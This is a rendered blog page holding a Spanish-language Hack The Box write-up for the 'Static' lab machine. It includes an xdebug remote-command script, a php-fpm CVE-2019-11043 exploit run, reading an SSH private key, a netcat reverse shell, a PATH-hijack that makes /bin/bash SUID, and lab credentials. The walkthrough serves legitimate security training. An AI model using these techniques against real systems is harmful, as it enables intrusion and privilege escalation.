@@ -1,0 +1,649 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB-Static - creep33.github.io</title>
+<meta name="description" content="WriteUp con metodología de la máquina Static.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="creep33.github.io">
+<meta property="og:title" content="HTB-Static">
+<meta property="og:url" content="http://localhost:4000/HTB-Static/">
+
+
+  <meta property="og:description" content="WriteUp con metodología de la máquina Static.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/WriteUps/Static.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-12-15T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/HTB-Static/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "creep33",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="creep33.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB-Static</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="creep33" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">creep33</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cibersecurity and<br>Ethical Hacking Student
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/creep33" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB-Static">
+    <meta itemprop="description" content="WriteUp con metodología de la máquina Static.">
+    <meta itemprop="datePublished" content="December 15, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB-Static
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-15T00:00:00+01:00">December 15, 2021 </time>&emsp;
+          
+          
+        </p>
+        <center><img src="/assets/images/WriteUps/Static.png" /></center>
+
+<p>IP -&gt; 10.10.10.246</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Utilizamos <a href="/Nmap/">nmap</a> y obtenemos los siguientes resultados.</p>
+
+<p><a href="/assets/files/WriteUps/Static.txt">Static Nmap Result</a></p>
+
+<h2 id="http">http</h2>
+<p>El robots, nos reporta 2 rutas.</p>
+
+<blockquote>
+  <p>/.ftp_uploads/
+/vpn/</p>
+</blockquote>
+
+<p>Descargamos el archivo “db.sql.gz” para analizarlo. Nos dice que está corrupto. Tenemos que restaurarlo.</p>
+
+<h3 id="dbsqlgz">db.sql.gz</h3>
+
+<p>Mediante la herramienta <a href="/fixgz/">fixgz</a> restauramos el archivo y lo extraemos.
+Al abrir el archivo db.sql, vemos credenciales. Tratamos de romper el hash por fuerza bruta.</p>
+
+<blockquote>
+  <p>USER: admin
+HASH: d033e22ae348aeb5660fc2140aec35850c4da997 (restored)
+PASS: admin
+TOTP: orxxi4c7orXWwzlo</p>
+</blockquote>
+
+<h2 id="http-1">http</h2>
+<p>En la página “/vpn/” iniciamos sesión pero tenemos que proporcionar un 2FA. 
+Buscamos “google authenticator addon firefox” para poner el OTP y obtener el código.</p>
+
+<blockquote>
+  <p>Iniciamos sesión</p>
+</blockquote>
+
+<p>Al poner el nombre “web” en el formulario, y darla a generar. Nos crea un archivo ovpn. Al abrirlo vemos que intenta conectarse a “vpn.static.ovpn”. Añadimos el dominio al /etc/hosts y nos conectamos a la vpn.</p>
+
+<p>Al intentar comunicarnos con los distintos segmentos, nos damos cuenta que no tenemos acceso a algunos, para ello añadimos el segmento 172.20.0.0/24 al <a href="/IP-Route/">IP-Route</a>. Sin proporcionar ip del router.</p>
+
+<blockquote>
+  <p>Tenemos traza con el segmento 172.20.0.0/24</p>
+</blockquote>
+
+<h1 id="17220010-1921682542">172.20.0.10, 192.168.254.2</h1>
+<h2 id="nmap-1">nmap</h2>
+<p>22 - ssh
+80 - http</p>
+
+<h2 id="http-2">http</h2>
+<p>Vemos un archivo info.php.</p>
+
+<blockquote>
+  <p>disable_functions -&gt; Podemos subir una webShell
+xdebug 2.6.0 -&gt; xdebug github exploit -&gt; Podemos intentar conseguir RCE.</p>
+</blockquote>
+
+<p>Aunque el script no nos decodifica el base64, modificamos el script.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span> <span class="n">re</span><span class="p">,</span> <span class="n">pdb</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+
+<span class="n">ip_port</span> <span class="o">=</span> <span class="p">(</span><span class="s">'0.0.0.0'</span><span class="p">,</span> <span class="mi">9000</span><span class="p">)</span>
+<span class="n">sk</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">sk</span><span class="p">.</span><span class="n">bind</span><span class="p">(</span><span class="n">ip_port</span><span class="p">)</span>
+<span class="n">sk</span><span class="p">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">10</span><span class="p">)</span>
+<span class="n">conn</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">sk</span><span class="p">.</span><span class="n">accept</span><span class="p">()</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+	<span class="n">client_data</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+	
+	<span class="n">base64_response</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s">'CDATA\[(.*?)\]'</span><span class="p">,</span> <span class="n">client_data</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">command_output</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="n">base64_response</span><span class="p">)</span>
+		<span class="k">print</span><span class="p">(</span><span class="n">command_output</span><span class="p">)</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">pass</span>
+	
+	<span class="n">data</span> <span class="o">=</span> <span class="nb">raw_input</span> <span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">)</span>
+	<span class="n">conn</span><span class="p">.</span><span class="n">sendall</span><span class="p">(</span><span class="s">'eval -i 1 -- %s</span><span class="se">\x00</span><span class="s">'</span> <span class="o">%</span> <span class="n">data</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'base64'</span><span class="p">))</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Tenemos shell en php</p>
+</blockquote>
+
+<h2 id="os-php">OS (php)</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">whoami
+pwd
+hostname</span> <span class="nt">-I</span>
+<span class="nb">ls</span> /home
+<span class="nb">ls</span> /home/www-data
+<span class="nb">ls</span> /home/www-data/.ssh
+<span class="nb">cat</span> /home/www-data/.ssh/id_rsa
+</code></pre></div></div>
+
+<blockquote>
+  <p>Tenemos conexión con la 192.168.254.3
+id_rsa</p>
+</blockquote>
+
+<p>Al intentar usar la id_rsa, no conseguimos conectarnos. Pero al utilizar el servicio ssh por el puerto 2222. Nos conecta</p>
+
+<h2 id="os-ssh-2222">OS (ssh 2222)</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /home
+<span class="nb">cat </span>user.txt
+<span class="nb">id
+sudo</span> <span class="nt">-l</span>
+<span class="nb">uname</span> <span class="nt">-a</span>
+<span class="nb">cat</span> /etc/os-release
+<span class="nb">cd</span> /var/www/html
+<span class="nb">cd </span>vpn
+<span class="nb">grep</span> <span class="nt">-r</span> <span class="nt">-i</span> <span class="nt">-E</span> <span class="s2">"user|pass|key"</span>
+ifconfig
+</code></pre></div></div>
+
+<blockquote>
+  <p>user.txt</p>
+</blockquote>
+
+<blockquote>
+  <p>Linux 4.19
+Ubuntu 18.04.4</p>
+</blockquote>
+
+<blockquote>
+  <p>USER: root
+PASS: 2108@C00l
+DB: static</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c</span> 1 192.168.254.3
+wget <span class="nt">-qO-</span> http://192.168.254.3
+</code></pre></div></div>
+
+<p>Local port forwarding por <strong>ssh</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> id_rsa www-data@10.10.10.246 <span class="nt">-p</span> 2222 <span class="nt">-L</span> 80:192.168.254.3:80
+</code></pre></div></div>
+
+<h1 id="1921682543">192.168.254.3</h1>
+<h2 id="http-3">http</h2>
+<p>En el servicio http, vemos una respuesta rara en un index.php
+Fuzzeamos el servicio con herramientas como <a href="/wfuzz/">wfuzz</a> o <a href="/gobuster/">gobuster</a> en busca de directorios y de archivos con extensión php.
+En las cabeceras de respuesta vemos que utiliza “php-fpm/7.1” buscamos en google “php-fpm/7.1 exploit github”. Y encontramos un exploit.</p>
+
+<blockquote>
+  <p><a href="https://github.com/theMiddleBlue/CVE-2019-11043">GitHub Exploit</a></p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py <span class="nt">--url</span> http://127.0.0.1/index.php <span class="nt">--verbose</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Nos sube una webShell</p>
+</blockquote>
+
+<p>Comprobamos si tenemos traza con mediante un ping. Pero no. Aunque la 192.168.254.2 si que responde.</p>
+
+<p>Podemos enviarnos una reverse shell desde la “192.168.254.3” a la “192.168.254.2”. Para ello necesitamos subir un binario estático de <strong>nc</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://github.com/yunchih/static-binaries/raw/master/nc
+scp <span class="nt">-P</span> 2222 <span class="nt">-i</span> id_rsa nc www-data@10.10.10.246:/tmp/nc
+
+<span class="nb">chmod</span> +x ./nc
+nc <span class="nt">-nlvp</span> 4646
+</code></pre></div></div>
+
+<p>Y nos enviamos una reverse shell con <strong>python3</strong> ya que está instalado en la “192.168.254.3”</p>
+
+<h2 id="os">OS</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
+getcap <span class="nt">-r</span> / 2&gt;/dev/null
+</code></pre></div></div>
+
+<blockquote>
+  <p>ersatool tiene capability para cambiar el UID</p>
+</blockquote>
+
+<p>Subimos un binario <strong>pspy</strong> para monitorizar tareas que se ejecuten en segundo plano.
+Vemos que cuando utilizamos el <strong>ersatool</strong>, pòr detrás se ejecuta el <strong>openssl</strong> de forma relativa. Podemos hacer un “path hijacking”.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
+<span class="nb">touch </span>openssl
+<span class="nb">chmod</span> +x openssl
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+<span class="nb">chmod </span>4755 /bin/bash
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+ersatool
+create
+asdasd
+
+bash <span class="nt">-p</span>
+
+<span class="nb">cat</span> /root/root.txt
+</code></pre></div></div>
+
+<blockquote>
+  <p>root.txt</p>
+</blockquote>
+
+<h1 id="17220011">172.20.0.11</h1>
+<h2 id="nmap-2">nmap</h2>
+<p>22 - ssh
+3306 - mySQL</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-uroot</span> <span class="nt">-p</span> <span class="nt">-h</span> 172.20.0.11
+2108@C00l
+</code></pre></div></div>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
+<span class="n">use</span> <span class="k">static</span><span class="p">;</span>
+<span class="k">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="k">describe</span> <span class="n">users</span><span class="p">;</span>
+<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">users</span><span class="p">;</span>
+<span class="k">select</span> <span class="n">load_file</span><span class="p">(</span><span class="nv">"/etc/passwd"</span><span class="p">);</span>
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">HTB</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#writeups" class="page__taxonomy-item" rel="tag">WriteUps</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-12-15T00:00:00+01:00">December 15, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/HTB-Sauna/" class="pagination--pager" title="HTB-Sauna
+">Previous</a>
+    
+    
+      <a href="/ebowla/" class="pagination--pager" title="Ebowla
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 creep33</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
